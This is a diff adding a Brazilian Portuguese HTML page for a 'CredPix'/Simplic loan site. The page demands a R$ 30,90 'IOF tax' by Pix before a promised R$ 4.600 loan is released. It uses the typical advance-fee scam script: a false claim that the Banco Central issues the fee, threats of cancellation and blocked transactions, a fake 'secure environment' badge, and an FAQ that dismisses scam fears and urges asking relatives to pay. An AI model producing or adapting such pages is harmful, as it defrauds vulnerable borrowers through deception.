@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <title>Pagamento IOF</title>
+    <meta name="credpix-base-title" content="Pagamento IOF">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <script src="../assets/js/credpix-upsell-init.js"></script>
+<script src="../assets/js/links.js"></script>
+<link rel="stylesheet" href="../assets/css/tailwind.css">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+
+<body class="bg-gray-50">
+  <header class="bg-[#1B5E20] border-b border-[#145A14] shadow-sm">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="flex justify-between items-center h-20">
+      <div class="flex items-center">
+        <img src="../assets/img/credpix-logo.png" alt="CredPix" class="h-8 md:h-10">
+      </div>
+    </div>
+  </div>
+</header>
+    <main class="py-8 px-4 md:py-12">
+        <div class="max-w-3xl mx-auto">
+            <div class="mb-6">
+                <div class="flex items-center justify-between mb-2">
+                    <span class="text-sm font-medium text-gray-600">Etapa Final</span>
+                    <span class="text-sm font-medium text-mp-blue">94%</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2">
+                    <div class="progress-bar bg-mp-blue h-2 rounded-full" style="width: 94%"></div>
+                </div>
+            </div>
+
+            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
+                <div class="text-center mb-8">
+                    <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Parabéns, falta pouco para você receber o valor do empréstimo na sua conta!</h1>
+                    <p class="text-gray-600">Você está a um passo de receber seu empréstimo, efetue o pagamento do imposto IOF (Imposto sobre Operações Financeiras) emitido pelo Banco Central para autorizar o saque imediatamente para sua conta.</p>
+                </div>
+
+                <div class="bg-red-50 border-l-4 border-red-500 p-5 mb-6">
+                    <div class="flex items-start gap-3">
+                        <svg class="w-6 h-6 text-red-500 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+                        </svg>
+                        <div>
+                            <p class="text-sm font-bold text-red-800 mb-1">AVISO</p>
+                            <p class="text-sm text-red-700">O não pagamento do IOF resultará no cancelamento do empréstimo e no bloqueio de futuras transações bancárias.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-50 border border-gray-200 rounded-xl p-5 mb-6">
+                    <h3 class="text-lg font-semibold text-gray-900 mb-4">O que é IOF?</h3>
+                    <p class="text-sm text-gray-600 mb-3">Aumente o volume 🔈</p>
+
+                    <div class="relative rounded-xl overflow-hidden bg-black" style="padding-bottom: 56.25%;">
+                        <video id="customVideo" class="absolute top-0 left-0 w-full h-full object-cover" muted playsinline autoplay loop>
+                            <source src="../assets/vid/video-iof.mp4" type="video/mp4">
+                        </video>
+
+                        <div id="videoOverlay" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-50 cursor-pointer transition-opacity duration-300">
+                            <span class="text-white text-sm font-medium px-4">Clique para ativar o som</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-50 border border-gray-200 rounded-xl p-5 mb-6">
+                    <h3 class="text-lg font-semibold text-gray-900 mb-4">Status do seu empréstimo</h3>
+
+                    <div class="space-y-4">
+                        <div class="timeline-item">
+                            <div class="timeline-dot done">
+                                <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <p class="font-semibold text-gray-900">Simulação</p>
+                                <p class="text-sm text-gray-600">Simulação realizada e cadastro concluído</p>
+                            </div>
+                        </div>
+
+                        <div class="timeline-item">
+                            <div class="timeline-dot done">
+                                <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <p class="font-semibold text-gray-900">Pagamento do Seguro</p>
+                                <p class="text-sm text-gray-600">Pagamento concluído com sucesso</p>
+                            </div>
+                        </div>
+
+                        <div class="timeline-item">
+                            <div class="timeline-dot current">
+                                <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <p class="font-semibold text-gray-900">Pagamento do Imposto IOF</p>
+                                <p class="text-sm text-gray-600">Aguardando pagamento para liberação do crédito</p>
+                            </div>
+                        </div>
+
+                        <div class="timeline-item">
+                            <div class="timeline-dot pending">
+                                <svg class="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <p class="font-semibold text-gray-900">Crédito na conta</p>
+                                <p class="text-sm text-gray-600">Crédito enviado para sua conta bancária</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-center mb-6">
+                    <img src="../assets/img/bc-logo.webp" alt="Banco Central" class="mx-auto mb-3" style="max-width: 180px;">
+                    <p class="text-sm text-gray-600">O não pagamento do imposto resulta no cancelamento do contrato do empréstimo, impossibilitando uma nova contratação por um prazo máximo de 90 dias</p>
+                </div>
+
+                <div class="bg-gradient-to-r from-green-50 to-green-100 border-2 border-green-500 rounded-xl p-6 text-center mb-6">
+                    <div class="text-sm font-semibold text-green-800 mb-2">Valor do empréstimo</div>
+                    <div id="limiteDisponivelValor" class="text-4xl font-bold text-green-800 mb-3">R$ 4.600,00</div>
+                </div>
+
+                <div class="bg-mp-light-blue border-2 border-mp-blue/30 rounded-xl p-6 mb-6 text-center">
+                    <div class="flex items-center justify-center gap-2 mb-3">
+                        <span class="text-lg font-semibold text-gray-900">Pague via Pix</span>
+                        <svg width="24" height="24" viewBox="0 0 24 24">
+                            <path fill="#3db1a5" d="m15.45 16.52l-3.01-3.01c-.11-.11-.24-.13-.31-.13s-.2.02-.31.13L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.08.08.2.13.31.13s.23-.05.31-.13l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"/>
+                            <path fill="#3db1a5" d="m21.11 9.85l-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.28.28-.65.42-1.02.42a1.5 1.5 0 0 1-1.02-.42L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.28-.28.65-.42 1.02-.42s.74.14 1.02.42l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"/>
+                        </svg>
+                    </div>
+                    <p class="text-sm text-gray-600 mb-3">O pagamento será confirmado imediatamente</p>
+                    <div class="text-4xl font-bold text-mp-blue mb-4">R$ 30,90</div>
+                </div>
+
+                <button type="button" data-credpix-checkout="up1" onclick="redirect('up1')" class="w-full bg-mp-blue text-white py-4 rounded-lg text-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all mb-4">
+                    Pagar agora
+                </button>
+
+                <div class="flex items-center justify-center gap-2 p-3 bg-gray-50 rounded-lg border border-gray-200 mb-6">
+                    <svg class="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                    </svg>
+                    <span class="text-sm font-semibold text-gray-700">Ambiente Seguro</span>
+                </div>
+
+                <div class="bg-white rounded-xl border border-gray-200">
+                    <h2 class="text-xl font-bold text-gray-900 p-5 border-b border-gray-200">Dúvidas Frequentes</h2>
+
+                    <div class="divide-y divide-gray-200">
+                        <details class="group">
+                            <summary class="flex items-center justify-between p-5 cursor-pointer hover:bg-gray-50">
+                                <span class="font-semibold text-gray-900">Por que o imposto IOF não é descontado do empréstimo?</span>
+                                <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"/>
+                                </svg>
+                            </summary>
+                            <div class="px-5 pb-5 text-gray-600">
+                                O valor do Imposto IOF é tratado separadamente pois ele é um imposto emitido pelo Banco Central assim que um empréstimo é aprovado, e é destinado aos cofres públicos, para garantir segurança para ambas as partes.
+                            </div>
+                        </details>
+
+                        <details class="group">
+                            <summary class="flex items-center justify-between p-5 cursor-pointer hover:bg-gray-50">
+                                <span class="font-semibold text-gray-900">O que acontece após pagar o imposto?</span>
+                                <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"/>
+                                </svg>
+                            </summary>
+                            <div class="px-5 pb-5 text-gray-600">
+                                Você será redirecionado automaticamente para a página onde confirmará e autorizará a transferência do dinheiro para sua conta.
+                            </div>
+                        </details>
+
+                        <details class="group">
+                            <summary class="flex items-center justify-between p-5 cursor-pointer hover:bg-gray-50">
+                                <span class="font-semibold text-gray-900">Quanto tempo demora para liberar o crédito?</span>
+                                <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"/>
+                                </svg>
+                            </summary>
+                            <div class="px-5 pb-5 text-gray-600">
+                                Como o pagamento é feito via Pix, a liberação do empréstimo é imediata. Todo o processo, incluindo a transferência do crédito, leva cerca de 5-10 minutos.
+                            </div>
+                        </details>
+
+                        <details class="group">
+                            <summary class="flex items-center justify-between p-5 cursor-pointer hover:bg-gray-50">
+                                <span class="font-semibold text-gray-900">Tô com medo de cair em golpe</span>
+                                <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"/>
+                                </svg>
+                            </summary>
+                            <div class="px-5 pb-5 text-gray-600">
+                                A Simplic atua há mais de 14 anos com empréstimos online, contando com milhares de clientes satisfeitos. Nosso site é seguro e confiável. Não solicitamos sua senha ou dados bancários.
+                            </div>
+                        </details>
+
+                        <details class="group">
+                            <summary class="flex items-center justify-between p-5 cursor-pointer hover:bg-gray-50">
+                                <span class="font-semibold text-gray-900">Posso pagar o imposto com cartão de crédito?</span>
+                                <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"/>
+                                </svg>
+                            </summary>
+                            <div class="px-5 pb-5 text-gray-600">
+                                Não, o imposto IOF só pode ser pago via Pix. Se você não tem uma conta em um banco que oferece Pix, peça a um amigo ou familiar para fazer o pagamento para você.
+                            </div>
+                        </details>
+
+                        <details class="group">
+                            <summary class="flex items-center justify-between p-5 cursor-pointer hover:bg-gray-50">
+                                <span class="font-semibold text-gray-900">O que acontece se eu não pagar o imposto?</span>
+                                <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="currentColor" viewBox="0 0 20 20">
+                                    <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"/>
+                                </svg>
+                            </summary>
+                            <div class="px-5 pb-5 text-gray-600">
+                                Se você não pagar o imposto, seu pedido de empréstimo será cancelado, mas lembre-se de que o imposto IOF é obrigatório pelo Banco Central, para garantir a segurança e processamento do seu pedido.
+                            </div>
+                        </details>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+<footer class="bg-[#1B5E20] border-t border-[#145A14] mt-auto">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+    <div class="flex flex-col items-center justify-center text-center space-y-4">
+      <img src="../assets/img/credpix-logo.png" alt="CredPix" class="h-12 md:h-14 mx-auto">
+      <div class="text-sm text-white space-y-1">
+        <p>Simplic © 2025 Instituição Financeira</p>
+        <p>CNPJ: 33.030.944/0001-60</p>
+      </div>
+    </div>
+  </div>
+</footer>
+<script src="../assets/js/main.js" defer></script>
+  <script src="../assets/js/preload-pix.js" defer></script>
+</body>
+</html>
